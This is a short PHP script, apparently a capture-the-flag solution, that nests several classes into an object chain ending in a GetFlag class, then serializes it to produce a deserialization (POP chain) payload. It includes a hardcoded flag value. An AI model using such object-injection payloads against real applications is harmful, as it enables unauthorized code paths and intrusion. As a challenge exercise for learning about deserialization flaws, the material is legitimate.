<?php
class start_gg {
    public $mod1;
    function __construct(){
        $this->mod1=new Call();
    }
}

class Call {
    public $mod1;
    function __construct(){
        $this->mod1=new funct();
    }
}
class funct {
    public $mod1;
    function __construct(){
        $this->mod1=new func();
    }

}
class func {
    public $mod1;
    function __construct(){
        $this->mod1=new string1();
    }


}
class string1 {
    public $str1;
    function __construct(){
        $this->str1=new GetFlag();
    }
   
}

class GetFlag {
    public function get_flag() {
        echo "flag:"."59DB9139E685F7D6A4A8784F9221066F";
    }
}

$a=new start_gg();
$results=serialize($a);
echo $results;




?>